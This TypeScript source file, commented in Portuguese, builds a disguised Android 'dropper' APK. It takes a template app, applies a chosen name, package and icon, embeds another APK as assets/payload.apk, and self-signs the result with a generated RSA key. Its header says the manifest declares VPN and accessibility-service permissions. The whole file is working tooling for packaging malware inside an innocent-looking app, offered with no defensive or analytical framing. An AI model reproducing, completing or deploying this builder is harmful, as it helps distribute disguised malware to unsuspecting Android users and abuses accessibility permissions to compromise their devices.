/**
 * Dropper Builder
 * Gera um APK dropper personalizado que:
 * 1. Tem nome e ícone customizados
 * 2. Embute o APK alvo como payload (assets/payload.apk)
 * 3. Declara VpnService + BIND_ACCESSIBILITY_SERVICE no manifest
 * 4. É assinado digitalmente com chave debug
 */

import AdmZip from "adm-zip";
import * as forge from "node-forge";
import path from "path";
import fs from "fs";
import sharp from "sharp";

// ─── Tipos ───────────────────────────────────────────────────────────────────

export interface DropperBuildOptions {
  appName: string;
  packageName?: string;
  payloadApkBuffer: Buffer;
  iconBuffer?: Buffer | null;
}

export interface DropperBuildResult {
  apkBuffer: Buffer;
  log: string[];
}

// ─── Constantes ──────────────────────────────────────────────────────────────

const TEMPLATE_PATH = path.join(process.cwd(), "server", "dropper-template", "dropper_base.apk");

const ICON_SIZES: Record<string, number> = {
  "res/mipmap-mdpi/ic_launcher.png": 48,
  "res/mipmap-hdpi/ic_launcher.png": 72,
  "res/mipmap-xhdpi/ic_launcher.png": 96,
  "res/mipmap-xxhdpi/ic_launcher.png": 144,
  "res/mipmap-xxxhdpi/ic_launcher.png": 192,
};

// ─── Função principal ─────────────────────────────────────────────────────────

export async function buildDropper(
  options: DropperBuildOptions,
): Promise<DropperBuildResult> {
  const log: string[] = [];
  const { appName, payloadApkBuffer, iconBuffer } = options;

  // Gera package name a partir do nome do app
  const packageName =
    options.packageName ||
    "com.dropper." +
      appName
        .toLowerCase()
        .replace(/[^a-z0-9]/g, "")
        .slice(0, 20) +
      Date.now().toString().slice(-6);

  log.push(`📦 Iniciando build do APK dropper...`);
  log.push(`  📱 Nome do app: ${appName}`);
  log.push(`  🔖 Package: ${packageName}`);

  // ── 1. Carrega o template base ─────────────────────────────────────────────

  if (!fs.existsSync(TEMPLATE_PATH)) {
    throw new Error(
      `Template do dropper não encontrado em: ${TEMPLATE_PATH}`,
    );
  }

  const templateBuffer = fs.readFileSync(TEMPLATE_PATH);
  const zip = new AdmZip(templateBuffer);
  log.push(`  ✅ Template base carregado`);

  // ── 2. Atualiza AndroidManifest.xml ────────────────────────────────────────

  log.push(`📝 Configurando AndroidManifest.xml...`);
  const manifestEntry = zip.getEntry("AndroidManifest.xml");
  if (!manifestEntry) throw new Error("Manifest não encontrado no template.");

  let manifestContent = manifestEntry.getData().toString("utf-8");
  manifestContent = manifestContent.replace(/\{\{PACKAGE_NAME\}\}/g, packageName);

  zip.deleteFile("AndroidManifest.xml");
  zip.addFile("AndroidManifest.xml", Buffer.from(manifestContent, "utf-8"));
  log.push(`  ✅ Package name configurado: ${packageName}`);

  // ── 3. Atualiza strings.xml com o nome do app ──────────────────────────────

  log.push(`🏷️  Configurando nome do app: "${appName}"...`);
  const stringsEntry = zip.getEntry("res/values/strings.xml");
  if (stringsEntry) {
    let stringsContent = stringsEntry.getData().toString("utf-8");
    stringsContent = stringsContent.replace(/\{\{APP_NAME\}\}/g, appName);
    zip.deleteFile("res/values/strings.xml");
    zip.addFile("res/values/strings.xml", Buffer.from(stringsContent, "utf-8"));
    log.push(`  ✅ Nome do app definido: "${appName}"`);
  }

  // ── 4. Processa e substitui ícones ─────────────────────────────────────────

  if (iconBuffer && iconBuffer.length > 0) {
    log.push(`🎨 Processando ícone personalizado...`);
    for (const [entryPath, size] of Object.entries(ICON_SIZES)) {
      try {
        const resized = await sharp(iconBuffer)
          .resize(size, size, { fit: "cover", position: "center" })
          .png()
          .toBuffer();

        zip.deleteFile(entryPath);
        zip.addFile(entryPath, resized);
        log.push(`  ✅ Ícone ${size}x${size}px gerado (${entryPath.split("/").pop()})`);
      } catch (err) {
        log.push(`  ⚠️  Falha ao gerar ícone ${size}x${size}: ${(err as Error).message}`);
      }
    }
  } else {
    log.push(`🎨 Usando ícone padrão (nenhum ícone enviado)`);
  }

  // ── 5. Embute o APK payload ────────────────────────────────────────────────

  log.push(`📥 Embutindo APK payload (${(payloadApkBuffer.length / 1024 / 1024).toFixed(1)} MB)...`);
  zip.deleteFile("assets/payload.apk");
  zip.addFile("assets/payload.apk", payloadApkBuffer);
  log.push(`  ✅ Payload embutido em assets/payload.apk`);

  // ── 6. Recompacta o APK ────────────────────────────────────────────────────

  log.push(`🗜️  Recompactando APK dropper...`);
  const repackedBuffer = zip.toBuffer();
  log.push(`  ✅ APK recompactado (${(repackedBuffer.length / 1024 / 1024).toFixed(1)} MB)`);

  // ── 7. Assina digitalmente ─────────────────────────────────────────────────

  log.push(`🔐 Assinando APK dropper digitalmente...`);
  const signedBuffer = await signDropper(repackedBuffer, log);

  log.push(`✅ APK dropper gerado com sucesso!`);
  log.push(`  📱 Nome: ${appName}`);
  log.push(`  🔖 Package: ${packageName}`);
  log.push(`  🔑 Assinado com chave debug RSA-2048/SHA-256`);

  return { apkBuffer: signedBuffer, log };
}

// ─── Assinatura digital ───────────────────────────────────────────────────────

async function signDropper(apkBuffer: Buffer, log: string[]): Promise<Buffer> {
  try {
    const keys = forge.pki.rsa.generateKeyPair({ bits: 2048, e: 0x10001 });
    const cert = forge.pki.createCertificate();

    cert.publicKey = keys.publicKey;
    cert.serialNumber = "01";
    cert.validity.notBefore = new Date();
    cert.validity.notAfter = new Date();
    cert.validity.notAfter.setFullYear(cert.validity.notBefore.getFullYear() + 30);

    const attrs = [
      { name: "commonName", value: "VPN APK Dropper Debug Key" },
      { name: "organizationName", value: "VPN Dropper" },
      { name: "countryName", value: "BR" },
    ];
    cert.setSubject(attrs);
    cert.setIssuer(attrs);
    cert.sign(keys.privateKey, forge.md.sha256.create());

    const p7 = forge.pkcs7.createSignedData();
    p7.content = forge.util.createBuffer(apkBuffer.toString("binary"));
    p7.addCertificate(cert);
    p7.addSigner({
      key: keys.privateKey,
      certificate: cert,
      digestAlgorithm: forge.pki.oids.sha256,
      authenticatedAttributes: [
        { type: forge.pki.oids.contentType, value: forge.pki.oids.data },
        { type: forge.pki.oids.messageDigest },
        { type: forge.pki.oids.signingTime, value: new Date().toISOString() },
      ],
    });

    p7.sign({ detached: true });

    const sigDer = forge.asn1.toDer(p7.toAsn1()).getBytes();
    const sigBuffer = Buffer.from(sigDer, "binary");

    const zip = new AdmZip(apkBuffer);
    const manifestMf = generateManifestMf(zip);
    const certSf = generateCertSf(manifestMf);

    zip.deleteFile("META-INF/MANIFEST.MF");
    zip.deleteFile("META-INF/CERT.SF");
    zip.deleteFile("META-INF/CERT.RSA");

    zip.addFile("META-INF/MANIFEST.MF", Buffer.from(manifestMf, "utf-8"));
    zip.addFile("META-INF/CERT.SF", Buffer.from(certSf, "utf-8"));
    zip.addFile("META-INF/CERT.RSA", sigBuffer);

    log.push(`  🔑 Chave debug gerada (RSA-2048 / SHA-256)`);
    log.push(`  📋 META-INF assinado com sucesso`);

    return zip.toBuffer();
  } catch (err) {
    log.push(`  ⚠️  Assinatura falhou: ${(err as Error).message}`);
    return apkBuffer;
  }
}

function generateManifestMf(zip: AdmZip): string {
  let mf = "Manifest-Version: 1.0\r\nCreated-By: VPN APK Dropper\r\n\r\n";
  for (const entry of zip.getEntries()) {
    if (entry.entryName.startsWith("META-INF/")) continue;
    const data = entry.getData();
    const md = forge.md.sha256.create();
    md.update(data.toString("binary"));
    const digest = forge.util.encode64(md.digest().getBytes());
    mf += `Name: ${entry.entryName}\r\nSHA-256-Digest: ${digest}\r\n\r\n`;
  }
  return mf;
}

function generateCertSf(manifestMf: string): string {
  const md = forge.md.sha256.create();
  md.update(forge.util.encodeUtf8(manifestMf));
  const mainDigest = forge.util.encode64(md.digest().getBytes());
  return (
    "Signature-Version: 1.0\r\n" +
    `SHA-256-Digest-Manifest: ${mainDigest}\r\n` +
    "Created-By: VPN APK Dropper\r\n\r\n"
  );
}
